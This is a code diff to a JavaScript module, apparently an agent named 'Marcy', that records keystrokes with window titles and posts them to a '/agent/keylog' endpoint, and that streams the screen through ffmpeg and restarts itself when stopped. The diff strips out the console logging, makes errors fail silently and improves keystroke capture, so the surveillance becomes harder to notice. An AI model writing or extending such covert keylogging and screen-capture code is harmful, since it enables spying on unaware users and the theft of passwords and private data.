@@ -17,14 +17,11 @@ class ConfigManager {
             const configData = fs.readFileSync(this.configPath, 'utf8');
             return JSON.parse(configData);
         } catch (error) {
-            console.error('Error loading configuration:', error);
             return {
                 agent_id: "default_agent",
-                server: "1.1.1.1",
-                protocol: "http",
-                rtmpPort: "1935",
                 key: {
                     send_interval: 5000,
+                    send_url: "http://localhost:80/agent/keylog"
                 },
                 screen: {
                     framerate: 30,
@@ -103,7 +100,6 @@ class MarcyKey {
             'PrintScreen': '[PrtSc]'
         };
 
-        // Subscribe to config changes
         this.unsubscribe = this.configManager.subscribe((newConfig) => {
             this.config = newConfig;
         });
@@ -127,8 +123,8 @@ class MarcyKey {
         const cleanTitle = this.cleanWindowTitle(windowTitle);
         return `[${timestamp}] [● ${cleanTitle}]`;
     }
+
     async sendData(data, windowTitle = '') {
-        console.log(data)
         try {
             const timestamp = new Date().toISOString();
             const url = `${this.config.protocol}://${this.config.server}/agent/keylog`;
@@ -145,7 +141,7 @@ class MarcyKey {
                 })
             });
         } catch (error) {
-            console.error('Error sending data:', error);
+            // Silent error handling
         }
     }
 
@@ -174,7 +170,11 @@ class MarcyKey {
 
         if (this.specialKeys[key] && !isKeyUp && !this.specialKeyStates[key]) {
             this.specialKeyStates[key] = true;
-            this.currentText += this.specialKeys[key];
+            if (key === 'Backspace') {
+                this.currentText = this.currentText.slice(0, -1);
+            } else {
+                this.currentText += this.specialKeys[key];
+            }
         }
         else if (this.specialKeys[key] && isKeyUp) {
             this.specialKeyStates[key] = false;
@@ -230,10 +230,8 @@ class MarcyScreen {
         this.teacherName = 'Teacher' + Math.floor(Math.random() * 1000);
         this.streamKey = this.teacherName.toLowerCase().replace(/\s+/g, '-');
 
-        // Subscribe to config changes
         this.unsubscribe = this.configManager.subscribe((newConfig) => {
             this.config = newConfig;
-            // Restart stream if running and config changed
             if (this.isEnabled) {
                 this.stop();
                 this.start();
@@ -245,8 +243,6 @@ class MarcyScreen {
         if (this.isEnabled) return;
         
         this.isEnabled = true;
-        console.log(`Starting stream as: ${this.teacherName}`);
-        console.log(`Stream key: ${this.streamKey}`);
 
         const ffmpegArgs = [
             '-f', 'gdigrab',
@@ -271,22 +267,17 @@ class MarcyScreen {
 
         this.process = spawn('ffmpeg', ffmpegArgs);
 
-        // Handle FFmpeg output
         this.process.stderr.on('data', (data) => {
-            console.log(`FFmpeg: ${data}`);
+            // Silent FFmpeg output
         });
 
         this.process.on('close', (code) => {
-            console.log(`FFmpeg process exited with code ${code}`);
             if (this.isEnabled) {
-                // Restart if it was not intentionally stopped
-                console.log('Restarting FFmpeg...');
                 this.start();
             }
         });
 
         this.process.on('error', (err) => {
-            console.error('Failed to start FFmpeg:', err);
             this.isEnabled = false;
         });
     }
@@ -296,7 +287,6 @@ class MarcyScreen {
         
         this.isEnabled = false;
         if (this.process) {
-            console.log('Stopping FFmpeg...');
             this.process.kill();
             this.process = null;
         }
@@ -306,7 +296,6 @@ class MarcyScreen {
         this.teacherName = name;
         this.streamKey = name.toLowerCase().replace(/\s+/g, '-');
         
-        // Restart stream if running
         if (this.isEnabled) {
             this.stop();
             this.start();
@@ -327,6 +316,6 @@ const configManager = new ConfigManager();
 configManager.startWatching();
 
 module.exports = {
-    MarcyKey: (config) => new MarcyKey(configManager),
-    MarcyScreen: (config) => new MarcyScreen(configManager)
+    MarcyKey: () => new MarcyKey(configManager),
+    MarcyScreen: () => new MarcyScreen(configManager)
 }; 
